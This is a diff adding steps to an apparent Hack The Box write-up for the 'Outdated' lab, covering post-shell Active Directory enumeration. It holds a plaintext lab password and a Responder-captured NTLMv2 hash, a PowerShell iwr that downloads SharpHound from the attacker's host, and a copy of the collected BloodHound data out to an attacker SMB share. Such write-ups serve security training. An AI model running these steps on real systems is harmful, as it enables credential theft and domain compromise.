@@ -1,5 +1,7 @@
 # Outdated
 
+![HTB - Pressed](images/htb_outdated.png)
+
 ```bash
 TARGET=10.10.11.175
 ```
@@ -445,14 +447,254 @@ PS C:\Users\btables\AppData\Local\Temp\SDIAG_7a49cd60-49a5-405b-a268-52e1ce0bde5
 outdated\btables
 ```
 
-## need to get back here
-
+This is the script running to check the apps on the emails.
 
 ```bash
+PS C:\Users\btables> cat check_mail.ps1
+Import-Module Mailozaurr
+$user = 'btables@outdated.htb'
+$pass = 'GHKKb7GEHcccdCT8tQV2QwL3'
+$regex = [Regex]::new('(http(s)?(:\/\/))?((\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[\w.]\.htb)(\/[^\s,]+)?)')     
+$already_seen = @()
+$client = connect-imap -server 'mail.outdated.htb' -password $pass -username $user -port 143 -options auto   
+while ($true) {
+    $msgs = Get-IMAPFolder -client $client -verbose
+    foreach ($msg in $msgs.Messages) {
+        if (-not ($already_seen -contains $msg.MessageId)) {
+            $already_seen = $already_seen + $msg.MessageId
+            $match = $regex.Matches($msg.TextBody.TrimEnd())
+            iwr $match.Value
+        }
+    }
+    if ($already_seen.count -ge 60) {$already_seen = @()}
+    #Disconnect-IMAP -Client $client
+    sleep 15
+    if (get-process -name msdt) {stop-process -name msdt -force}
+    sleep 15
+}
+```
+
+The credentials used on the script seems to be only valid for the email server. It does not work for the domain.
+
+```bash
+$ netexec smb $TARGET -u 'btables' -p 'GHKKb7GEHcccdCT8tQV2QwL3'
+SMB         10.10.11.175    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.175    445    DC               [-] outdated.htb\btables:GHKKb7GEHcccdCT8tQV2QwL3 STATUS_LOGON_FAILURE
+```
+
+The hostname for the host we got a shell is `Client`, and checking its IP on `systeminfo` (172.16.20.20() it seems we are not on our real target (IP 10.10.11.175).
+
+```bash
+PS C:\Users\btables> systeminfo
+
+Host Name:                 CLIENT
+OS Name:                   Microsoft Windows 10 Enterprise N
+OS Version:                10.0.19043 N/A Build 19043
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          setup
+Registered Organization:
+Product ID:                00330-00182-51735-AA058
+Original Install Date:     6/15/2022, 8:20:38 AM
+System Boot Time:          7/1/2024, 11:37:16 PM
+System Manufacturer:       Microsoft Corporation
+System Model:              Virtual Machine
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+BIOS Version:              American Megatrends Inc. 090007 , 5/18/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     1,652 MB
+Available Physical Memory: 570 MB
+Virtual Memory: Max Size:  2,292 MB
+Virtual Memory: Available: 899 MB
+Virtual Memory: In Use:    1,393 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    outdated.htb
+Logon Server:              \\DC
+Hotfix(s):                 4 Hotfix(s) Installed.
+                           [01]: KB4601554
+                           [02]: KB5000736
+                           [03]: KB5001330
+                           [04]: KB5001405
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Microsoft Hyper-V Network Adapter
+                                 Connection Name: Ethernet
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 172.16.20.20
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
 ```
 
 ```bash
+PS C:\Users\btables> ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : client
+   Primary Dns Suffix  . . . . . . . : outdated.htb
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : outdated.htb
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : Microsoft Hyper-V Network Adapter
+   Physical Address. . . . . . . . . : 00-15-5D-19-AE-01
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 172.16.20.20(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.20.1
+   DNS Servers . . . . . . . . . . . : 172.16.20.1
+   NetBIOS over Tcpip. . . . . . . . : Enabled
 ```
+
+Only `administrator` is present here, but we don't have access to it.
+
+```bash
+PS C:\Users> dir
+    Directory: C:\Users
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         6/15/2022  10:45 AM                administrator
+d-----        12/13/2023   4:20 PM                btables
+d-r---         6/15/2022   9:23 AM                Public
+```
+
+We know that we can reach to our kali from this machine, and we can try to get the the NTLM hash using `Responder`.
+
+```bash
+$ sudo responder -I tun0 -wv
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.4.0
+...
+```
+
+```bash
+PS C:\Users> net use \\10.10.14.2\share
+Enter the user name for '10.10.14.2':
+```
+
+```bash
+[+] Listening for events...
+
+[!] Error starting TCP server on port 80, check permissions or other servers running.
+[SMB] NTLMv2-SSP Client   : 10.10.11.175
+[SMB] NTLMv2-SSP Username : OUTDATED\btables
+[SMB] NTLMv2-SSP Hash     : btables::OUTDATED:5174cb6ce4f72a1e:4B4509BF7380512DF4D509FFD05F57BD:0101000000000000804E2D42CCC8DA01F739C3EA0218AFB000000000020008004B004F0059004B0001001E00570049004E002D004600550035004C00450038004A00380042005400310004003400570049004E002D004600550035004C00450038004A0038004200540031002E004B004F0059004B002E004C004F00430041004C00030014004B004F0059004B002E004C004F00430041004C00050014004B004F0059004B002E004C004F00430041004C0007000800804E2D42CCC8DA010600040002000000080030003000000000000000000000000020000064ECF5C95CEC69A0D9EC1102AD1E00CEAE250BB8F3AD554D1997FB7DC85CB00F0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000
+```
+
+```bash
+$ cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.11.175.txt 
+btables::OUTDATED:5174cb6ce4f72a1e:4B4509BF7380512DF4D509FFD05F57BD:0101000000000000804E2D42CCC8DA01F739C3EA0218AFB000000000020008004B004F0059004B0001001E00570049004E002D004600550035004C00450038004A00380042005400310004003400570049004E002D004600550035004C00450038004A0038004200540031002E004B004F0059004B002E004C004F00430041004C00030014004B004F0059004B002E004C004F00430041004C00050014004B004F0059004B002E004C004F00430041004C0007000800804E2D42CCC8DA010600040002000000080030003000000000000000000000000020000064ECF5C95CEC69A0D9EC1102AD1E00CEAE250BB8F3AD554D1997FB7DC85CB00F0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000
+```
+
+But it seems the password is not on HTB common wordlist `rockyou.txt`.
+
+```bash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.11.175.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:10 DONE (2024-06-27 20:05) 0g/s 1333Kp/s 1333Kc/s 1333KC/s !SkicA!..*7¡Vamos!
+Session completed.
+```
+
+We see that we are really autenticated with a domain user. We can try to collect bloodhoud data direct on the shell. For that lets transfer `SharpHouse.exe` to the machine and run it from there.
+
+```bash
+$ python3 -m http.server 8181
+Serving HTTP on 0.0.0.0 port 8181 (http://0.0.0.0:8181/) ...
+```
+
+```bash
+PS C:\Users> mkdir C:\Temp
+    Directory: C:\
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          7/2/2024   2:52 AM                Temp
+PS C:\Users> cd C:\Temp
+
+PS C:\Temp> iwr http://10.10.14.2:8181/SharpHound.exe -outfile SharpHound.exe
+PS C:\Temp> dir
+    Directory: C:\Temp
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          7/2/2024   2:53 AM         906752 SharpHound.exe
+```
+
+```bash
+PS C:\Temp> C:\Temp\SharpHound.exe -C all
+2024-07-02T02:53:53.3383016-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, 
+Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2024-07-02T02:53:53.3539224-07:00|INFORMATION|Initializing SharpHound at 2:53 AM on 7/2/2024
+2024-07-02T02:53:54.1607086-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Tru
+sts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2024-07-02T02:53:54.6256591-07:00|INFORMATION|Beginning LDAP search for outdated.htb
+2024-07-02T02:53:54.7741817-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2024-07-02T02:53:54.7741817-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2024-07-02T02:54:24.7355674-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 37 MB RAM
+2024-07-02T02:54:45.3502445-07:00|INFORMATION|Consumers finished, closing output channel
+2024-07-02T02:54:45.4283680-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+Closing writers
+2024-07-02T02:54:45.6002420-07:00|INFORMATION|Status: 97 objects finished (+97 1.94)/s -- Using 59 MB RAM
+2024-07-02T02:54:45.6002420-07:00|INFORMATION|Enumeration finished in 00:00:50.9929922
+2024-07-02T02:54:45.7565166-07:00|INFORMATION|SharpHound Enumeration Completed at 2:54 AM on 7/2/2024! Happy 
+Graphing!
+```
+
+```bash
+PS C:\Temp> dir
+    Directory: C:\Temp
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          7/2/2024   2:54 AM          11198 20240702025444_BloodHound.zip
+-a----          7/2/2024   2:54 AM           8662 MjdhMDc5MjItNDk4MS00NjFiLWFkY2ItZjQ0ZTBlODI3Mzhh.bin       
+-a----          7/2/2024   2:53 AM         906752 SharpHound.exe
+```
+
+```bash
+$ impacket-smbserver share $(pwd) -smb2support -user kali -pass kali                                     
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+```bash
+PS C:\Temp> net use \\10.10.14.2\share /u:kali kali
+The command completed successfully.
+
+PS C:\Temp> copy 20240702025444_BloodHound.zip \\10.10.14.2\share
+```
+
+```bash
+$ sudo neo4j start
+$ bloodhound &
+```
+
+The members of the group `ITSTAFF@OUTDATED.HTB` have the ability to write to the "`msds-KeyCredentialLink`" property on `SFLOWERS@OUTDATED.HTB`. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT.
+
+![AddKeyCredentialLink](images/bh_AddKeyCredentialLink.png)
 
 ```bash
 ```
